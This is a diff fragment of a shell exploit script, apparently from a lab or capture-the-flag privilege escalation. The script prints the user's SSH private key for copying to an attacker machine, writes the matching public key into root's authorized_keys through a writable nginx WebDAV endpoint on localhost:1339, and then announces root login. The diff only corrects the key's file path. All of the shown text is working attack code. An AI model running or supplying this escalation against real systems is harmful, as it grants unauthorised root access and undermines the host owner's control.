@@ -40,6 +40,6 @@ echo "[+] Printing SSH private key (copy this to your attacker machine)..."
 cat ~/.ssh/id_rsa
 
 echo "[+] Uploading public key into root's authorized_keys via nginx WebDAV..."
-curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
+curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat ~/.ssh/id_rsa.pub)"
 
 echo "[+] Done. Use the SSH private key to log in as root."
